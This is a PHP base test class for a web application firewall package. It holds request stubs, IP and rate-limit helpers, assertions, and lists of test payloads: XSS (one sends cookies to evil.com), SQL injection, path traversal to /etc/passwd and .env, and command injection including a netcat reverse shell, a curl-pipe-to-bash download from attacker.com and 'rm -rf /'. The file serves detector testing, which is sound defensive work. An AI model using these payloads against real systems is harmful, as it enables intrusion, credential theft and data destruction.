<?php declare(strict_types=1);

namespace Lalaz\Waf\Tests\Common;

use Lalaz\Waf\Detection\ThreatDetector;
use Lalaz\Waf\IpFilter\IpList;
use Lalaz\Waf\IpFilter\IpMatcher;
use Lalaz\Waf\RateLimit\RateLimiter;
use Lalaz\Waf\RateLimit\Stores\MemoryStore;
use Lalaz\Waf\Tests\Stubs\StubRequest;
use Lalaz\Waf\Tests\Stubs\StubResponse;
use PHPUnit\Framework\TestCase;

/**
 * Base test case for WAF package unit tests.
 *
 * Provides common utilities and helpers for WAF-specific
 * testing including request/response stubs, threat detection
 * and rate limiting helpers.
 *
 * @package lalaz/waf
 */
abstract class WafUnitTestCase extends TestCase
{
    /**
     * Default rate limit for testing.
     */
    protected const DEFAULT_RATE_LIMIT = 60;

    /**
     * Default decay window in minutes for rate limiting.
     */
    protected const DEFAULT_DECAY_MINUTES = 1;

    /**
     * Setup the test environment.
     */
    protected function setUp(): void
    {
        parent::setUp();

        foreach ($this->getSetUpMethods() as $method) {
            if (method_exists($this, $method)) {
                $this->{$method}();
            }
        }
    }

    /**
     * Clean up the test environment.
     */
    protected function tearDown(): void
    {
        foreach (array_reverse($this->getTearDownMethods()) as $method) {
            if (method_exists($this, $method)) {
                $this->{$method}();
            }
        }

        parent::tearDown();
    }

    /**
     * Get the list of setup methods to call.
     *
     * @return array<int, string>
     */
    protected function getSetUpMethods(): array
    {
        return [
            'setUpWaf',
        ];
    }

    /**
     * Get the list of teardown methods to call.
     *
     * @return array<int, string>
     */
    protected function getTearDownMethods(): array
    {
        return [
            'tearDownWaf',
        ];
    }

    // =========================================================================
    // Factory Methods
    // =========================================================================

    /**
     * Create a stub request for testing.
     */
    protected function createRequest(
        string $method = 'GET',
        string $path = '/',
        array $headers = [],
        string $ip = '127.0.0.1',
        ?object $user = null,
        mixed $body = [],
        array $queryParams = [],
    ): StubRequest {
        return new StubRequest(
            httpMethod: $method,
            path: $path,
            headers: $headers,
            ip: $ip,
            user: $user,
            body: $body,
            queryParams: $queryParams,
        );
    }

    /**
     * Create a stub response for testing.
     */
    protected function createResponse(): StubResponse
    {
        return new StubResponse();
    }

    /**
     * Create a threat detector with all detection types.
     */
    protected function createThreatDetector(): ThreatDetector
    {
        return ThreatDetector::all();
    }

    /**
     * Create a rate limiter with memory store.
     */
    protected function createRateLimiter(): RateLimiter
    {
        return new RateLimiter(new MemoryStore());
    }

    /**
     * Create an IP list with optional initial IPs.
     */
    protected function createIpList(array $ips = []): IpList
    {
        return new IpList($ips);
    }

    // =========================================================================
    // XSS Payload Generators
    // =========================================================================

    /**
     * Get common XSS payloads for testing.
     */
    protected function getXssPayloads(): array
    {
        return [
            '<script>alert("xss")</script>',
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<body onload="alert(1)">',
            '<iframe src="javascript:alert(1)">',
            '<a href="javascript:alert(1)">click</a>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<img src=x onerror=alert(1)>',
            '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
        ];
    }

    // =========================================================================
    // SQL Injection Payload Generators
    // =========================================================================

    /**
     * Get common SQL injection payloads for testing.
     */
    protected function getSqlInjectionPayloads(): array
    {
        return [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "1 UNION SELECT * FROM users",
            "admin'--",
            "1; SLEEP(5)--",
            "1' AND '1'='1",
            "1 OR 1=1",
            "'; INSERT INTO users VALUES('hacker', 'password')--",
            "1; UPDATE users SET password='hacked' WHERE id=1--",
            "1' UNION SELECT username, password FROM users--",
        ];
    }

    // =========================================================================
    // Path Traversal Payload Generators
    // =========================================================================

    /**
     * Get common path traversal payloads for testing.
     */
    protected function getPathTraversalPayloads(): array
    {
        return [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '%2e%2e%2f%2e%2e%2fetc/passwd',
            '....//....//....//etc/passwd',
            '/etc/passwd%00.jpg',
            '..%252f..%252f..%252fetc/passwd',
            '.htaccess',
            '.git/config',
            '.env',
            'wp-config.php',
        ];
    }

    // =========================================================================
    // Command Injection Payload Generators
    // =========================================================================

    /**
     * Get common command injection payloads for testing.
     */
    protected function getCommandInjectionPayloads(): array
    {
        return [
            '; ls -la',
            '| cat /etc/passwd',
            '`whoami`',
            '$(whoami)',
            '; rm -rf /',
            '| nc -e /bin/sh attacker.com 4444',
            '&& cat /etc/passwd',
            '; curl http://attacker.com/shell.sh | bash',
        ];
    }

    // =========================================================================
    // IP Address Generators
    // =========================================================================

    /**
     * Get private IP addresses for testing.
     */
    protected function getPrivateIps(): array
    {
        return [
            '10.0.0.1',
            '10.255.255.255',
            '172.16.0.1',
            '172.31.255.255',
            '192.168.0.1',
            '192.168.255.255',
        ];
    }

    /**
     * Get public IP addresses for testing.
     */
    protected function getPublicIps(): array
    {
        return [
            '8.8.8.8',
            '1.1.1.1',
            '203.0.113.1',
            '198.51.100.1',
        ];
    }

    /**
     * Get loopback IP addresses for testing.
     */
    protected function getLoopbackIps(): array
    {
        return [
            '127.0.0.1',
            '127.0.0.2',
            '127.255.255.255',
            '::1',
        ];
    }

    // =========================================================================
    // Assertions
    // =========================================================================

    /**
     * Assert that a payload is detected as a threat.
     */
    protected function assertThreatDetected(string $payload, string $message = ''): void
    {
        $detector = $this->createThreatDetector();
        $threats = $detector->scan($payload);

        $this->assertNotEmpty($threats, $message ?: "Payload should be detected as threat: {$payload}");
    }

    /**
     * Assert that a payload is NOT detected as a threat.
     */
    protected function assertNoThreatDetected(string $payload, string $message = ''): void
    {
        $detector = $this->createThreatDetector();
        $threats = $detector->scan($payload);

        $this->assertEmpty($threats, $message ?: "Payload should NOT be detected as threat: {$payload}");
    }

    /**
     * Assert that an IP matches a pattern.
     */
    protected function assertIpMatches(string $ip, string $pattern, string $message = ''): void
    {
        $this->assertTrue(
            IpMatcher::matches($ip, $pattern),
            $message ?: "IP {$ip} should match pattern {$pattern}"
        );
    }

    /**
     * Assert that an IP does NOT match a pattern.
     */
    protected function assertIpNotMatches(string $ip, string $pattern, string $message = ''): void
    {
        $this->assertFalse(
            IpMatcher::matches($ip, $pattern),
            $message ?: "IP {$ip} should NOT match pattern {$pattern}"
        );
    }

    /**
     * Assert that an IP is private.
     */
    protected function assertIpIsPrivate(string $ip, string $message = ''): void
    {
        $this->assertTrue(
            IpMatcher::isPrivate($ip),
            $message ?: "IP {$ip} should be private"
        );
    }

    /**
     * Assert that an IP is NOT private.
     */
    protected function assertIpIsNotPrivate(string $ip, string $message = ''): void
    {
        $this->assertFalse(
            IpMatcher::isPrivate($ip),
            $message ?: "IP {$ip} should NOT be private"
        );
    }

    /**
     * Assert that a response has a specific status code.
     */
    protected function assertResponseStatus(StubResponse $response, int $expected, string $message = ''): void
    {
        $this->assertEquals(
            $expected,
            $response->getStatusCode(),
            $message ?: "Response should have status {$expected}"
        );
    }

    /**
     * Assert that a response has a specific header.
     */
    protected function assertResponseHasHeader(StubResponse $response, string $name, string $message = ''): void
    {
        $this->assertTrue(
            $response->hasHeader($name),
            $message ?: "Response should have header {$name}"
        );
    }

    /**
     * Assert that a response header has a specific value.
     */
    protected function assertResponseHeaderEquals(
        StubResponse $response,
        string $name,
        string $expected,
        string $message = ''
    ): void {
        $this->assertEquals(
            $expected,
            $response->getHeader($name),
            $message ?: "Response header {$name} should equal {$expected}"
        );
    }
}
